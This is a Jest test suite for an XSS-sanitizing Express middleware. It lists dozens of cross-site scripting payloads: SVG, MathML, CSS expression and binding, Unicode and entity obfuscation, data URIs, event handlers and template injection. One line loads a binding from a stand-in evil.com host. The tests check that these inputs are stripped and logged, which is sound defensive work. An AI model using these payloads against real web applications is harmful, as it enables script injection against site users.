/* eslint-disable @typescript-eslint/no-explicit-any */
/**
 * Advanced XSS Protection Security Test Suite
 * Tests for comprehensive XSS prevention including SVG, Unicode, CSS injection, and context-aware sanitization
 */

import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll } from '@jest/globals';
import supertest from 'supertest';
import express from 'express';
import { PrismaClient } from '@teaching-engine/database';
import {
  advancedXssProtection,
  sanitizeHtmlAdvanced,
  sanitizeEmailAdvanced,
  sanitizeUrlAdvanced,
  sanitizeCssContent,
  detectXssAttempt,
  unicodeNormalization,
} from '../../middleware/advancedXssProtection';
import { generateAuthToken } from '../../services/auth/authService';
import { logger } from '../../logger';

// Mock logger
jest.mock('../../logger', () => ({
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn(),
  debug: jest.fn(),
}));

describe('Advanced XSS Protection Security Tests', () => {
  let app: express.Application;
  let prisma: PrismaClient;
  let request: supertest.SuperTest<supertest.Test>;
  let testToken: string;

  // Advanced XSS attack vectors
  const advancedXssPayloads = [
    // SVG-based XSS
    '<svg onload=alert("XSS")>',
    '<svg><script>alert("XSS")</script></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">',
    '<svg><foreignObject><img src=x onerror=alert("XSS")></foreignObject></svg>',
    '<svg><use href="data:image/svg+xml,&lt;svg id=&quot;x&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;#x"></use></svg>',
    '<svg><animate attributeName=href values=javascript:alert(1)></animate>',
    '<svg><set attributeName=href to=javascript:alert(1)>',

    // Math/MathML XSS
    '<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("XSS") src=x>">',
    '<math href="javascript:alert(1)">CLICKME</math>',
    '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction></math>',

    // CSS-based XSS
    '<style>@import"javascript:alert(\'XSS\')"</style>',
    '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
    '<style>@media\\0screen\\9,\\0tv\\9{body{background:url("javascript:alert(\'XSS\')")}}</style>',
    '<style>*{color:expression(alert("XSS"))}</style>',
    '<link rel=stylesheet href="javascript:alert(\'XSS\')">',
    '<style>div{background-image:url(javascript:alert("XSS"))}</style>',

    // Unicode-based bypasses
    '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;', // javascript:alert(1)
    '\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003A\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029;', // javascript:alert(1)
    '\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x31\\x29', // javascript:alert(1)
    'j\\u0061vascript:alert(1)',
    'jav\\u00E1script:alert(1)',
    'j\\u0130script:alert(1)',

    // Mixed case and obfuscation
    'JaVaScRiPt:alert("XSS")',
    'JAVASCRIPT:alert("XSS")',
    'jAvAsCrIpT:alert("XSS")',
    'java\tscript:alert("XSS")',
    'java\nscript:alert("XSS")',
    'java\rscript:alert("XSS")',
    'java\x20script:alert("XSS")',
    'java\x09script:alert("XSS")',
    'java\x0Ascript:alert("XSS")',
    'java\x0Dscript:alert("XSS")',

    // Data URI XSS
    'data:text/html,<script>alert("XSS")</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
    'data:image/svg+xml,<svg onload=alert("XSS")>',
    'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoIlhTUyIpPg==',

    // Event handler variations
    'onmouseover=alert("XSS")',
    'onfocus=alert("XSS")',
    'onblur=alert("XSS")',
    'onchange=alert("XSS")',
    'onsubmit=alert("XSS")',
    'onreset=alert("XSS")',
    'onselect=alert("XSS")',
    'onunload=alert("XSS")',
    'onbeforeunload=alert("XSS")',
    'onhashchange=alert("XSS")',
    'onpageshow=alert("XSS")',
    'onpagehide=alert("XSS")',
    'onresize=alert("XSS")',
    'onscroll=alert("XSS")',
    'onstorage=alert("XSS")',
    'onmessage=alert("XSS")',
    'onpopstate=alert("XSS")',
    'onoffline=alert("XSS")',
    'ononline=alert("XSS")',

    // Contextual bypasses
    '"><script>alert("XSS")</script>',
    "'><script>alert('XSS')</script>",
    '</script><script>alert("XSS")</script>',
    '</title><script>alert("XSS")</script>',
    '</style><script>alert("XSS")</script>',
    '</textarea><script>alert("XSS")</script>',
    '</noscript><script>alert("XSS")</script>',

    // Template injection
    '${alert("XSS")}',
    '{{alert("XSS")}}',
    '#{alert("XSS")}',
    '<%= alert("XSS") %>',
    '<% alert("XSS") %>',
    '{%alert("XSS")%}',
    '[[alert("XSS")]]',

    // DOM clobbering
    '<img name="submit" src="x">',
    '<form><input name="action"><input name="submit"><input name="form"></form>',
    '<iframe name="alert" src="x">',

    // Advanced encoding
    '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
    '%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%252Fscript%253E',
    '\u003cscript\u003ealert("XSS")\u003c/script\u003e',

    // Comment-based bypasses
    '<!--<script>alert("XSS")</script>-->',
    '/*<script>alert("XSS")</script>*/',
    '//<script>alert("XSS")</script>',

    // XML/CDATA bypasses
    '<![CDATA[<script>alert("XSS")</script>]]>',
    '<?xml version="1.0"?><script>alert("XSS")</script>',
  ];

  // Unicode normalization attack vectors
  const unicodeAttacks = [
    'java\u0130script:alert(1)', // Turkish capital I with dot
    'java\u0073cript:alert(1)', // Latin small letter s
    'java\u0435cript:alert(1)', // Cyrillic small letter ie
    'java\u043Ecript:alert(1)', // Cyrillic small letter o
    'java\u0455cript:alert(1)', // Cyrillic small letter dze
    'java\u0440cript:alert(1)', // Cyrillic small letter er
    'java\u0440cript:alert(1)', // Cyrillic small letter er
    'j\u0430v\u0430script:alert(1)', // Mixed Latin/Cyrillic
    'j\u0061v\u0430script:alert(1)', // Unicode escapes
  ];

  // CSS injection payloads
  const cssInjectionPayloads = [
    'expression(alert("XSS"))',
    'url("javascript:alert(\'XSS\')")',
    '@import "javascript:alert(\'XSS\')"',
    'behavior:url(xss.htc)',
    '-moz-binding:url(http://evil.com/xss.xml#xss)',
    'background:url(vbscript:msgbox("XSS"))',
    'list-style-image:url(javascript:alert("XSS"))',
    'content:url(data:text/html,<script>alert("XSS")</script>)',
  ];

  beforeAll(async () => {
    process.env.JWT_SECRET = 'test-advanced-xss-secret';
    process.env.NODE_ENV = 'test';

    // Initialize test database
    prisma = new PrismaClient({
      datasources: {
        db: { url: process.env.DATABASE_URL ?? 'file:./test-advanced-xss.db' },
      },
    });

    // Create test user and token
    const testUser = await prisma.user.create({
      data: {
        email: 'advanced.xss@test.com',
        name: 'Advanced XSS Test User',
        password: 'HashedPassword123!',
        role: 'USER',
      },
    });

    testToken = await generateAuthToken(testUser.id.toString(), testUser.email);

    // Setup Express app with advanced XSS protection
    app = express();
    app.use(express.json({ limit: '1mb' }));
    app.use(express.urlencoded({ extended: true, limit: '1mb' }));
    app.use(advancedXssProtection);

    // Test endpoints
    app.post('/api/test/html-content', (req: Request, res: Response) => {
      res.json({ content: req.body.content });
    });

    app.post('/api/test/css-content', (req: Request, res: Response) => {
      res.json({ styles: req.body.styles });
    });

    app.post('/api/test/email', (req: Request, res: Response) => {
      res.json({ email: req.body.email });
    });

    app.post('/api/test/url', (req: Request, res: Response) => {
      res.json({ url: req.body.url });
    });

    app.post('/api/test/mixed-content', (req: Request, res: Response) => {
      res.json({
        title: req.body.title,
        description: req.body.description,
        html: req.body.html,
        css: req.body.css,
        links: req.body.links,
      });
    });

    request = supertest(app);
  });

  afterAll(async () => {
    await prisma.user.deleteMany({
      where: { email: { contains: 'advanced.xss' } },
    });
    await prisma.$disconnect();
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('SVG XSS Protection', () => {
    it('should block SVG-based XSS attacks', async () => {
      const svgPayloads = advancedXssPayloads.filter((payload) => payload.includes('<svg'));

      for (const payload of svgPayloads) {
        const response = await request.post('/api/test/html-content').send({ content: payload });

        expect(response.status).toBe(200);
        const sanitizedContent = response.body.content;

        // SVG with script content should be completely removed or sanitized
        expect(sanitizedContent).not.toContain('onload=');
        expect(sanitizedContent).not.toContain('<script>');
        expect(sanitizedContent).not.toContain('alert(');
        expect(sanitizedContent).not.toContain('javascript:');

        // Should not contain dangerous SVG elements
        if (sanitizedContent.includes('<svg>')) {
          expect(sanitizedContent).not.toMatch(/<svg[^>]*onload/i);
          expect(sanitizedContent).not.toMatch(/<svg[^>]*href.*javascript/i);
        }
      }
    });

    it('should sanitize SVG with foreignObject', async () => {
      const payload = '<svg><foreignObject><img src=x onerror=alert("XSS")></foreignObject></svg>';
      const response = await request.post('/api/test/html-content').send({ content: payload });

      expect(response.status).toBe(200);
      const sanitizedContent = response.body.content;

      expect(sanitizedContent).not.toContain('onerror=');
      expect(sanitizedContent).not.toContain('alert(');
    });

    it('should handle nested SVG attacks', async () => {
      const payload = '<div><svg><script>alert("XSS")</script></svg><p>Normal content</p></div>';
      const response = await request.post('/api/test/html-content').send({ content: payload });

      expect(response.status).toBe(200);
      const sanitizedContent = response.body.content;

      expect(sanitizedContent).not.toContain('<script>');
      expect(sanitizedContent).not.toContain('alert(');
      expect(sanitizedContent).toContain('Normal content'); // Safe content preserved
    });
  });

  describe('MathML XSS Protection', () => {
    it('should block MathML-based XSS attacks', async () => {
      const mathPayloads = advancedXssPayloads.filter((payload) => payload.includes('<math'));

      for (const payload of mathPayloads) {
        const response = await request.post('/api/test/html-content').send({ content: payload });

        expect(response.status).toBe(200);
        const sanitizedContent = response.body.content;

        expect(sanitizedContent).not.toContain('javascript:');
        expect(sanitizedContent).not.toContain('alert(');
        expect(sanitizedContent).not.toContain('href=');
      }
    });
  });

  describe('CSS Injection Protection', () => {
    it('should block CSS-based XSS attacks', async () => {
      for (const payload of cssInjectionPayloads) {
        const response = await request.post('/api/test/css-content').send({ styles: payload });

        expect(response.status).toBe(200);
        const sanitizedStyles = response.body.styles;

        expect(sanitizedStyles).not.toContain('expression(');
        expect(sanitizedStyles).not.toContain('javascript:');
        expect(sanitizedStyles).not.toContain('vbscript:');
        expect(sanitizedStyles).not.toContain('@import');
        expect(sanitizedStyles).not.toContain('behavior:');
        expect(sanitizedStyles).not.toContain('-moz-binding:');
        expect(sanitizedStyles).not.toContain('alert(');
      }
    });

    it('should sanitize style attributes', async () => {
      const payload = '<div style="background:url(javascript:alert(\\"XSS\\"))">Content</div>';
      const response = await request.post('/api/test/html-content').send({ content: payload });

      expect(response.status).toBe(200);
      const sanitizedContent = response.body.content;

      expect(sanitizedContent).not.toContain('javascript:');
      expect(sanitizedContent).not.toContain('alert(');
      expect(sanitizedContent).toContain('Content'); // Safe content preserved
    });
  });

  describe('Unicode Normalization Protection', () => {
    it('should normalize Unicode and detect obfuscated XSS', async () => {
      for (const payload of unicodeAttacks) {
        const response = await request.post('/api/test/mixed-content').send({ title: payload });

        expect(response.status).toBe(200);
        const sanitizedTitle = response.body.title;

        // Should not contain javascript: after normalization
        expect(sanitizedTitle).not.toContain('javascript:');
        expect(sanitizedTitle).not.toContain('alert(');

        // Should detect and block the normalized version
        expect(sanitizedTitle).not.toMatch(/script.*:/i);
      }
    });

    it('should handle HTML entity encoded XSS', async () => {
      const payload =
        '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;';
      const response = await request.post('/api/test/html-content').send({ content: payload });

      expect(response.status).toBe(200);
      const sanitizedContent = response.body.content;

      // Should decode and then sanitize
      expect(sanitizedContent).not.toContain('javascript:');
      expect(sanitizedContent).not.toContain('alert(');
    });
  });

  describe('Data URI Protection', () => {
    it('should block dangerous data URIs', async () => {
      const dataUriPayloads = advancedXssPayloads.filter((payload) => payload.includes('data:'));

      for (const payload of dataUriPayloads) {
        const response = await request.post('/api/test/url').send({ url: payload });

        expect(response.status).toBe(200);
        const sanitizedUrl = response.body.url;

        // Dangerous data URIs should be blocked
        if (payload.includes('script') || payload.includes('alert')) {
          expect(sanitizedUrl).toBe('');
        }
      }
    });

    it('should allow safe data URIs', async () => {
      const safeDataUris = [
        'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==',
        'data:text/plain;charset=utf-8,Hello%20World',
      ];

      for (const uri of safeDataUris) {
        const response = await request.post('/api/test/url').send({ url: uri });

        expect(response.status).toBe(200);
        const sanitizedUrl = response.body.url;

        expect(sanitizedUrl).toBe(uri); // Safe URIs should be preserved
      }
    });
  });

  describe('Event Handler Protection', () => {
    it('should remove all event handlers', async () => {
      const eventHandlerPayloads = advancedXssPayloads.filter((payload) => payload.includes('on'));

      for (const payload of eventHandlerPayloads) {
        const response = await request.post('/api/test/html-content').send({ content: payload });

        expect(response.status).toBe(200);
        const sanitizedContent = response.body.content;

        // Check for various event handlers
        expect(sanitizedContent).not.toMatch(/\bon\w+\s*=/gi);
        expect(sanitizedContent).not.toContain('alert(');
      }
    });
  });

  describe('Context-Aware Sanitization', () => {
    it('should handle mixed content types appropriately', async () => {
      const mixedContent = {
        title: '<script>alert("Title XSS")</script>Safe Title',
        description:
          '<p onclick="alert(\\"Desc XSS\\")">Description with <strong>formatting</strong></p>',
        html: '<div style="background:url(javascript:alert(\\"HTML XSS\\"))">HTML content</div>',
        css: 'body { background: url(javascript:alert("CSS XSS")); }',
        links: [
          'https://safe.example.com',
          'javascript:alert("Link XSS")',
          'https://another-safe.com',
        ],
      };

      const response = await request.post('/api/test/mixed-content').send(mixedContent);

      expect(response.status).toBe(200);
      const sanitized = response.body;

      // Title should be text-only (strict sanitization)
      expect(sanitized.title).not.toContain('<script>');
      expect(sanitized.title).not.toContain('alert(');
      expect(sanitized.title).toContain('Safe Title');

      // Description should allow safe HTML but block dangerous attributes
      expect(sanitized.description).not.toContain('onclick=');
      expect(sanitized.description).not.toContain('alert(');
      expect(sanitized.description).toContain('<strong>'); // Safe formatting preserved

      // HTML content should be sanitized
      expect(sanitized.html).not.toContain('javascript:');
      expect(sanitized.html).not.toContain('alert(');
      expect(sanitized.html).toContain('HTML content');

      // CSS should be completely sanitized
      expect(sanitized.css).not.toContain('javascript:');
      expect(sanitized.css).not.toContain('alert(');

      // Links should filter out dangerous URLs
      expect(sanitized.links).toContain('https://safe.example.com');
      expect(sanitized.links).toContain('https://another-safe.com');
      expect(sanitized.links).not.toContain('javascript:alert("Link XSS")');
    });
  });

  describe('Advanced Detection and Logging', () => {
    it('should detect and log XSS attempts', async () => {
      const maliciousPayload = '<script>alert("Detected XSS")</script>';

      await request.post('/api/test/html-content').send({ content: maliciousPayload });

      // Verify that the attempt was logged
      expect(logger.warn).toHaveBeenCalledWith(
        expect.objectContaining({
          xssAttempt: true,
          sanitizedFrom: expect.stringContaining('script'),
        }),
        expect.stringContaining('XSS attempt detected'),
      );
    });

    it('should handle deeply nested XSS attempts', async () => {
      const deeplyNested = {
        level1: {
          level2: {
            level3: {
              content: '<svg onload=alert("Deep XSS")>',
              array: ['<script>alert("Array XSS")</script>', 'safe content'],
            },
          },
        },
      };

      const response = await request.post('/api/test/mixed-content').send(deeplyNested);

      expect(response.status).toBe(200);
      const sanitized = response.body;

      // Deep nested XSS should be sanitized
      expect(JSON.stringify(sanitized)).not.toContain('onload=');
      expect(JSON.stringify(sanitized)).not.toContain('<script>');
      expect(JSON.stringify(sanitized)).not.toContain('alert(');
      expect(JSON.stringify(sanitized)).toContain('safe content');
    });
  });

  describe('Performance and Resource Protection', () => {
    it('should handle large payloads efficiently', async () => {
      const largePayload =
        '<div>' +
        'A'.repeat(50000) +
        '<script>alert("XSS")</script>' +
        'B'.repeat(50000) +
        '</div>';

      const startTime = Date.now();
      const response = await request.post('/api/test/html-content').send({ content: largePayload });
      const endTime = Date.now();

      expect(response.status).toBe(200);
      expect(endTime - startTime).toBeLessThan(5000); // Should complete within 5 seconds

      const sanitizedContent = response.body.content;
      expect(sanitizedContent).not.toContain('<script>');
      expect(sanitizedContent).not.toContain('alert(');
    });

    it('should prevent ReDoS attacks', async () => {
      // Patterns that could cause ReDoS
      const redosPayloads = [
        'a'.repeat(100000) + '<script>alert("XSS")</script>',
        '('.repeat(10000) + 'alert("XSS")' + ')'.repeat(10000),
        '/*' + '*'.repeat(100000) + '*/',
      ];

      for (const payload of redosPayloads) {
        const startTime = Date.now();
        const response = await request.post('/api/test/html-content').send({ content: payload });
        const endTime = Date.now();

        expect(response.status).toBe(200);
        expect(endTime - startTime).toBeLessThan(3000); // Should not hang
      }
    });
  });

  describe('Utility Function Tests', () => {
    describe('sanitizeHtmlAdvanced', () => {
      it('should sanitize HTML with advanced XSS protection', () => {
        const result = sanitizeHtmlAdvanced(
          '<svg onload=alert("XSS")><script>alert("XSS")</script></svg>',
        );
        expect(result).not.toContain('onload=');
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('alert(');
      });
    });

    describe('sanitizeEmailAdvanced', () => {
      it('should handle advanced email attacks', () => {
        const maliciousEmail = 'user+<script>alert("XSS")</script>@example.com';
        const result = sanitizeEmailAdvanced(maliciousEmail);
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('alert(');
        expect(result).toMatch(/^[^<>]+@[^<>]+$/);
      });
    });

    describe('sanitizeUrlAdvanced', () => {
      it('should handle advanced URL attacks', () => {
        const maliciousUrl = 'javascript:alert("XSS")';
        const result = sanitizeUrlAdvanced(maliciousUrl);
        expect(result).toBe('');
      });

      it('should allow safe URLs', () => {
        const safeUrl = 'https://example.com/path?param=value';
        const result = sanitizeUrlAdvanced(safeUrl);
        expect(result).toBe(safeUrl);
      });
    });

    describe('sanitizeCssContent', () => {
      it('should sanitize CSS injection attempts', () => {
        const maliciousCss = 'body { background: url(javascript:alert("XSS")); }';
        const result = sanitizeCssContent(maliciousCss);
        expect(result).not.toContain('javascript:');
        expect(result).not.toContain('alert(');
      });
    });

    describe('detectXssAttempt', () => {
      it('should detect various XSS patterns', () => {
        expect(detectXssAttempt('<script>alert("XSS")</script>')).toBe(true);
        expect(detectXssAttempt('<svg onload=alert("XSS")>')).toBe(true);
        expect(detectXssAttempt('javascript:alert("XSS")')).toBe(true);
        expect(detectXssAttempt('Safe content')).toBe(false);
      });
    });

    describe('unicodeNormalization', () => {
      it('should normalize Unicode to prevent bypasses', () => {
        const maliciousUnicode = 'java\u0130script:alert(1)';
        const normalized = unicodeNormalization(maliciousUnicode);
        expect(normalized).not.toContain('\u0130');
        // Should normalize to detectable pattern
        expect(detectXssAttempt(normalized)).toBe(true);
      });
    });
  });
});
